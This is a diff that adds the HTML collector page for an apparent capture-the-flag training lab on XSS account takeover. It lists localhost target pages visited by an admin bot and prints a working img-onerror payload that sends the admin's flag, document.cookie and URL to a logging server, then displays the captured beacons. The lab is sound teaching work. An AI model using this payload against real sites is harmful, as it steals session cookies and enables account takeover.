@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Lab 20 — Account Takeover Exfil</title>
+  <style>
+    body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:20px;}
+    .panel{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:16px;}
+    button{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:14px;margin-right:8px;}
+    .entry{border-bottom:1px solid #30363d;padding:8px 0;word-break:break-all;font-size:12px;}
+  </style>
+</head>
+<body>
+<h2 style="color:#f85149;">Lab 20 — Capstone: Account Takeover Exfil Monitor</h2>
+<p style="color:#7d8590;margin:12px 0;">Monitor beacons from the admin's browser. When your XSS fires in the admin's session, their flag arrives here.</p>
+
+<div class="panel">
+  <h3 style="margin-bottom:8px;">Target surfaces:</h3>
+  <ul style="color:#7d8590;font-size:13px;">
+    <li><a href="http://localhost:3000/lab20/comments" target="_blank" style="color:#58a6ff;">Community Board</a> — has a <code>&lt;script&gt;</code> filter + weak CSP. Admin bot visits.</li>
+    <li><a href="http://localhost:3000/lab20" target="_blank" style="color:#58a6ff;">Message Admin</a> — no filter, admin bot reads the inbox. <strong>Easier path.</strong></li>
+  </ul>
+</div>
+
+<div class="panel">
+  <h3 style="margin-bottom:8px;">Universal exfil payload:</h3>
+  <pre style="background:#1c2128;padding:12px;border-radius:6px;font-size:12px;overflow-x:auto;color:#3fb950;">&lt;img src=x onerror="fetch('http://localhost:3001/log',{
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({
+    lab:'lab20',
+    flag: typeof ADMIN_FLAG !== 'undefined' ? ADMIN_FLAG : 'n/a',
+    cookie: document.cookie,
+    url: location.href
+  })
+})"&gt;</pre>
+</div>
+
+<div class="panel">
+  <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;">
+    <h3>Exfil Log — <span id="count">0</span> entries</h3>
+    <button onclick="loadLog()">Refresh</button>
+  </div>
+  <div id="log">No beacons yet.</div>
+</div>
+
+<script>
+async function loadLog() {
+  const res = await fetch('/log');
+  const data = await res.json();
+  document.getElementById('count').textContent = data.length;
+  const el = document.getElementById('log');
+  if (!data.length) { el.textContent = 'Waiting for the admin bot to trigger your payload…'; return; }
+  el.innerHTML = data.map(e =>
+    `<div class="entry"><span style="color:#7d8590;">${e.ts}</span><br><span style="color:#3fb950;">${JSON.stringify(e).replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span></div>`
+  ).join('');
+}
+loadLog();
+setInterval(loadLog, 3000);
+</script>
+</body>
+</html>
